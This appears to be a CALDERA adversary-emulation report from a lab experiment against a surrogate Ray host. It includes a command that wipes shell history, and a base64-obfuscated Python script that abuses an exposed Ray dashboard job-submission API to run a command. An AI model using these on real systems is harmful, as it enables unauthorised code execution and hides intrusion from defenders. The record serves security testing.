@@ -1,0 +1,284 @@
+{
+  "name": "experiment-shadowray_caldera_autosut-supervised__shadowray-single-host-surrogate__s1_20260905T125604Z-af00586b",
+  "host_group": [
+    {
+      "paw": "exp3eb767e1c6",
+      "sleep_min": 30,
+      "sleep_max": 60,
+      "watchdog": 0,
+      "group": "red",
+      "architecture": "arm64",
+      "platform": "linux",
+      "server": "http://172.17.0.2:8888",
+      "upstream_dest": "http://172.17.0.2:8888",
+      "username": "root",
+      "location": "/usr/local/bin/sandcat",
+      "pid": 25,
+      "ppid": 1,
+      "trusted": true,
+      "executors": [
+        "proc",
+        "sh"
+      ],
+      "privilege": "Elevated",
+      "exe_name": "sandcat",
+      "host": "218185ab41e2",
+      "contact": "HTTP",
+      "proxy_receivers": {},
+      "proxy_chain": [],
+      "origin_link_id": "",
+      "deadman_enabled": true,
+      "available_contacts": [
+        "HTTP"
+      ],
+      "host_ip_addrs": [
+        "172.17.0.5"
+      ],
+      "display_name": "218185ab41e2$root",
+      "created": "2026-09-05T12:58:14Z",
+      "last_seen": "2026-09-05T12:59:08Z",
+      "links": [
+        {
+          "id": "532b9af4-0958-4b30-8306-1f1df2da871b",
+          "paw": "exp3eb767e1c6",
+          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "status": 0,
+          "score": 0,
+          "jitter": 0,
+          "decide": "2026-09-05T12:58:14Z",
+          "pin": 0,
+          "pid": "30",
+          "facts": [],
+          "relationships": [],
+          "used": [],
+          "unique": "532b9af4-0958-4b30-8306-1f1df2da871b",
+          "collect": "2026-09-05T12:58:14Z",
+          "finish": "2026-09-05T12:58:14Z",
+          "ability": {
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "tactic": "defense-evasion",
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "technique_id": "T1070.003",
+            "name": "Avoid logs",
+            "description": "Stop terminal from logging history",
+            "executors": [
+              {
+                "name": "sh",
+                "platform": "darwin",
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "code": null,
+                "language": null,
+                "build_target": null,
+                "payloads": [],
+                "uploads": [],
+                "timeout": 60,
+                "parsers": [],
+                "cleanup": [],
+                "variations": [],
+                "additional_info": {}
+              },
+              {
+                "name": "sh",
+                "platform": "linux",
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "code": null,
+                "language": null,
+                "build_target": null,
+                "payloads": [],
+                "uploads": [],
+                "timeout": 60,
+                "parsers": [],
+                "cleanup": [],
+                "variations": [],
+                "additional_info": {}
+              },
+              {
+                "name": "psh",
+                "platform": "windows",
+                "command": "Clear-History;Clear",
+                "code": null,
+                "language": null,
+                "build_target": null,
+                "payloads": [],
+                "uploads": [],
+                "timeout": 60,
+                "parsers": [],
+                "cleanup": [],
+                "variations": [],
+                "additional_info": {}
+              }
+            ],
+            "requirements": [],
+            "privilege": null,
+            "repeatable": false,
+            "buckets": [
+              "defense-evasion"
+            ],
+            "additional_info": {},
+            "access": {},
+            "singleton": false,
+            "plugin": "stockpile",
+            "delete_payload": true
+          },
+          "executor": {
+            "name": "sh",
+            "platform": "linux",
+            "command": "> $HOME/.bash_history && unset HISTFILE",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          },
+          "cleanup": 0,
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "host": "218185ab41e2",
+          "output": "False",
+          "deadman": false,
+          "agent_reported_time": "2026-09-05T12:58:14Z"
+        }
+      ],
+      "pending_contact": "HTTP"
+    }
+  ],
+  "start": "2026-09-05T12:58:15Z",
+  "steps": {
+    "exp3eb767e1c6": {
+      "steps": [
+        {
+          "link_id": "1a73543b-efc1-4162-9083-16aa3061893d",
+          "ability_id": "493caf4d-019c-585b-a604-a7b740be18c2",
+          "command": "printf '%s' aW1wb3J0IGpzb24sIHN5cywgdGltZSwgdXJsbGliLmVycm9yLCB1cmxsaWIucmVxdWVzdApqb2JzID0ganNvbi5sb2FkcygnW3siZW50cnlwb2ludCI6ICJwcmludGYgXCclc1wnIGF1dG9zdXQtMDI3MmU1MGExYjBlNDk2NGY1ZWMyNzY3YmU3NDBmMDkgPiAvdG1wL2F1dG9zdXRfZWZmZWN0X2I2YjI2NGZmMjUwYzI4ZjAudHh0In1dJykKYmFzZSA9ICdodHRwOi8vMTcyLjE3LjAuNDo4MjY1Jwp0ZXJtaW5hbCA9IHsnU1VDQ0VFREVEJywgJ0ZBSUxFRCcsICdTVE9QUEVEJ30KZGVmIHJlcXVlc3QobWV0aG9kLCBwYXRoLCBwYXlsb2FkPU5vbmUpOgogICAgZGF0YSA9IGpzb24uZHVtcHMocGF5bG9hZCkuZW5jb2RlKCkgaWYgcGF5bG9hZCBpcyBub3QgTm9uZSBlbHNlIE5vbmUKICAgIHJlcSA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoYmFzZSArIHBhdGgsIGRhdGE9ZGF0YSwgbWV0aG9kPW1ldGhvZCkKICAgIGlmIGRhdGEgaXMgbm90IE5vbmU6CiAgICAgICAgcmVxLmFkZF9oZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlvbi9qc29uJykKICAgIHRyeToKICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PTMwKSBhcyByZXNwb25zZToKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnN0YXR1cywgcmVzcG9uc2UucmVhZCgpLmRlY29kZSgpCiAgICBleGNlcHQgdXJsbGliLmVycm9yLkhUVFBFcnJvciBhcyBlcnJvcjoKICAgICAgICByZXR1cm4gZXJyb3IuY29kZSwgZXJyb3IucmVhZCgpLmRlY29kZSgpCmZvciBwYXlsb2FkIGluIGpvYnM6CiAgICBwb3N0X3N0YXR1cywgcG9zdF9ib2R5ID0gcmVxdWVzdCgnUE9TVCcsICcvYXBpL2pvYnMvJywgcGF5bG9hZCkKICAgIHByaW50KCdwb3N0JywgcG9zdF9zdGF0dXMsIHBvc3RfYm9keVs6MzAwXSkKICAgIGlmIHBvc3Rfc3RhdHVzIDwgMjAwIG9yIHBvc3Rfc3RhdHVzID49IDMwMDoKICAgICAgICBzeXMuZXhpdCgxKQogICAgcG9zdF9qc29uID0ganNvbi5sb2Fkcyhwb3N0X2JvZHkpCiAgICBzdWJtaXNzaW9uX2lkID0gcG9zdF9qc29uLmdldCgnc3VibWlzc2lvbl9pZCcpIG9yIHBvc3RfanNvbi5nZXQoJ2pvYl9pZCcpCiAgICBpZiBub3Qgc3VibWlzc2lvbl9pZDoKICAgICAgICBzeXMuZXhpdCgxKQogICAgZm9yIGF0dGVtcHQgaW4gcmFuZ2UoMzApOgogICAgICAgIHBvbGxfc3RhdHVzLCBwb2xsX2JvZHkgPSByZXF1ZXN0KCdHRVQnLCAnL2FwaS9qb2JzLycgKyBzdWJtaXNzaW9uX2lkKQogICAgICAgIGlmIHBvbGxfc3RhdHVzID09IDQwNDoKICAgICAgICAgICAgcHJpbnQoJ3BvbGxfdW5hdmFpbGFibGU9c3Vycm9nYXRlX29yX2xlZ2FjeV9lbmRwb2ludCcpCiAgICAgICAgICAgIHN5cy5leGl0KDApCiAgICAgICAgaWYgcG9sbF9zdGF0dXMgPCAyMDAgb3IgcG9sbF9zdGF0dXMgPj0gMzAwOgogICAgICAgICAgICBzeXMuZXhpdCgxKQogICAgICAgIHN0YXR1cyA9IGpzb24ubG9hZHMocG9sbF9ib2R5KS5nZXQoJ3N0YXR1cycpCiAgICAgICAgcHJpbnQoJ3BvbGwnLCBhdHRlbXB0LCBzdGF0dXMpCiAgICAgICAgaWYgc3RhdHVzIGluIHRlcm1pbmFsOgogICAgICAgICAgICBzeXMuZXhpdCgwIGlmIHN0YXR1cyA9PSAnU1VDQ0VFREVEJyBlbHNlIDEpCiAgICAgICAgdGltZS5zbGVlcCgxKQpzeXMuZXhpdCgxKQ== | base64 -d > /tmp/ray_probe.py && python3 /tmp/ray_probe.py",
+          "plaintext_command": "printf '%s' aW1wb3J0IGpzb24sIHN5cywgdGltZSwgdXJsbGliLmVycm9yLCB1cmxsaWIucmVxdWVzdApqb2JzID0ganNvbi5sb2FkcygnW3siZW50cnlwb2ludCI6ICJwcmludGYgXCclc1wnIGF1dG9zdXQtMDI3MmU1MGExYjBlNDk2NGY1ZWMyNzY3YmU3NDBmMDkgPiAvdG1wL2F1dG9zdXRfZWZmZWN0X2I2YjI2NGZmMjUwYzI4ZjAudHh0In1dJykKYmFzZSA9ICdodHRwOi8vMTcyLjE3LjAuNDo4MjY1Jwp0ZXJtaW5hbCA9IHsnU1VDQ0VFREVEJywgJ0ZBSUxFRCcsICdTVE9QUEVEJ30KZGVmIHJlcXVlc3QobWV0aG9kLCBwYXRoLCBwYXlsb2FkPU5vbmUpOgogICAgZGF0YSA9IGpzb24uZHVtcHMocGF5bG9hZCkuZW5jb2RlKCkgaWYgcGF5bG9hZCBpcyBub3QgTm9uZSBlbHNlIE5vbmUKICAgIHJlcSA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoYmFzZSArIHBhdGgsIGRhdGE9ZGF0YSwgbWV0aG9kPW1ldGhvZCkKICAgIGlmIGRhdGEgaXMgbm90IE5vbmU6CiAgICAgICAgcmVxLmFkZF9oZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlvbi9qc29uJykKICAgIHRyeToKICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PTMwKSBhcyByZXNwb25zZToKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnN0YXR1cywgcmVzcG9uc2UucmVhZCgpLmRlY29kZSgpCiAgICBleGNlcHQgdXJsbGliLmVycm9yLkhUVFBFcnJvciBhcyBlcnJvcjoKICAgICAgICByZXR1cm4gZXJyb3IuY29kZSwgZXJyb3IucmVhZCgpLmRlY29kZSgpCmZvciBwYXlsb2FkIGluIGpvYnM6CiAgICBwb3N0X3N0YXR1cywgcG9zdF9ib2R5ID0gcmVxdWVzdCgnUE9TVCcsICcvYXBpL2pvYnMvJywgcGF5bG9hZCkKICAgIHByaW50KCdwb3N0JywgcG9zdF9zdGF0dXMsIHBvc3RfYm9keVs6MzAwXSkKICAgIGlmIHBvc3Rfc3RhdHVzIDwgMjAwIG9yIHBvc3Rfc3RhdHVzID49IDMwMDoKICAgICAgICBzeXMuZXhpdCgxKQogICAgcG9zdF9qc29uID0ganNvbi5sb2Fkcyhwb3N0X2JvZHkpCiAgICBzdWJtaXNzaW9uX2lkID0gcG9zdF9qc29uLmdldCgnc3VibWlzc2lvbl9pZCcpIG9yIHBvc3RfanNvbi5nZXQoJ2pvYl9pZCcpCiAgICBpZiBub3Qgc3VibWlzc2lvbl9pZDoKICAgICAgICBzeXMuZXhpdCgxKQogICAgZm9yIGF0dGVtcHQgaW4gcmFuZ2UoMzApOgogICAgICAgIHBvbGxfc3RhdHVzLCBwb2xsX2JvZHkgPSByZXF1ZXN0KCdHRVQnLCAnL2FwaS9qb2JzLycgKyBzdWJtaXNzaW9uX2lkKQogICAgICAgIGlmIHBvbGxfc3RhdHVzID09IDQwNDoKICAgICAgICAgICAgcHJpbnQoJ3BvbGxfdW5hdmFpbGFibGU9c3Vycm9nYXRlX29yX2xlZ2FjeV9lbmRwb2ludCcpCiAgICAgICAgICAgIHN5cy5leGl0KDApCiAgICAgICAgaWYgcG9sbF9zdGF0dXMgPCAyMDAgb3IgcG9sbF9zdGF0dXMgPj0gMzAwOgogICAgICAgICAgICBzeXMuZXhpdCgxKQogICAgICAgIHN0YXR1cyA9IGpzb24ubG9hZHMocG9sbF9ib2R5KS5nZXQoJ3N0YXR1cycpCiAgICAgICAgcHJpbnQoJ3BvbGwnLCBhdHRlbXB0LCBzdGF0dXMpCiAgICAgICAgaWYgc3RhdHVzIGluIHRlcm1pbmFsOgogICAgICAgICAgICBzeXMuZXhpdCgwIGlmIHN0YXR1cyA9PSAnU1VDQ0VFREVEJyBlbHNlIDEpCiAgICAgICAgdGltZS5zbGVlcCgxKQpzeXMuZXhpdCgxKQ== | base64 -d > /tmp/ray_probe.py && python3 /tmp/ray_probe.py",
+          "delegated": "2026-09-05T12:58:15Z",
+          "run": "2026-09-05T12:59:08Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 71,
+          "description": "Posts a job to the Ray dashboard job-submission API and polls it.",
+          "name": "T1190 - Exploit exposed Ray dashboard job-submission API",
+          "attack": {
+            "tactic": "initial-access",
+            "technique_name": "Exploit Public-Facing Application",
+            "technique_id": "T1190"
+          },
+          "output": {
+            "stdout": "post 200 {\"returncode\":0,\"stdout\":\"\",\"submission_id\":\"sid_surrogate_0001\"}poll_unavailable=surrogate_or_legacy_endpoint",
+            "stderr": "",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2026-09-05T12:59:08Z"
+        }
+      ]
+    }
+  },
+  "finish": "2026-09-05T12:59:10Z",
+  "planner": "atomic",
+  "adversary": {
+    "adversary_id": "1046ef38-24d1-46db-89b6-0bd07612c8d8",
+    "name": "experiment-shadowray_caldera_autosut-supervised__shadowray-single-host-surrogate__s1_20260905T125604Z-af00586b",
+    "description": "AutoSUT-generated adversary",
+    "atomic_ordering": [
+      "493caf4d-019c-585b-a604-a7b740be18c2"
+    ],
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "tags": [
+      "autosut"
+    ],
+    "has_repeatable_abilities": false,
+    "plugin": ""
+  },
+  "jitter": "0/0",
+  "objectives": {
+    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "name": "default",
+    "description": "This is a default objective that runs forever.",
+    "goals": [
+      {
+        "target": "exhaustion",
+        "value": "complete",
+        "count": 1048576,
+        "operator": "==",
+        "achieved": false
+      }
+    ],
+    "percentage": 0.0
+  },
+  "facts": [
+    {
+      "unique": "file.sensitive.extensionwav",
+      "trait": "file.sensitive.extension",
+      "name": "file.sensitive.extension",
+      "value": "wav",
+      "created": "2026-09-05T12:56:12Z",
+      "score": 1,
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "origin_type": "IMPORTED",
+      "links": [],
+      "relationships": [],
+      "limit_count": -1,
+      "collected_by": [],
+      "technique_id": ""
+    },
+    {
+      "unique": "file.sensitive.extensionyml",
+      "trait": "file.sensitive.extension",
+      "name": "file.sensitive.extension",
+      "value": "yml",
+      "created": "2026-09-05T12:56:12Z",
+      "score": 1,
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "origin_type": "IMPORTED",
+      "links": [],
+      "relationships": [],
+      "limit_count": -1,
+      "collected_by": [],
+      "technique_id": ""
+    },
+    {
+      "unique": "file.sensitive.extensionpng",
+      "trait": "file.sensitive.extension",
+      "name": "file.sensitive.extension",
+      "value": "png",
+      "created": "2026-09-05T12:56:12Z",
+      "score": 1,
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "origin_type": "IMPORTED",
+      "links": [],
+      "relationships": [],
+      "limit_count": -1,
+      "collected_by": [],
+      "technique_id": ""
+    },
+    {
+      "unique": "server.malicious.urlkeyloggedsite.com",
+      "trait": "server.malicious.url",
+      "name": "server.malicious.url",
+      "value": "keyloggedsite.com",
+      "created": "2026-09-05T12:56:12Z",
+      "score": 1,
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "origin_type": "IMPORTED",
+      "links": [],
+      "relationships": [],
+      "limit_count": -1,
+      "collected_by": [],
+      "technique_id": ""
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "exp3eb767e1c6": []
+    }
+  ]
+}
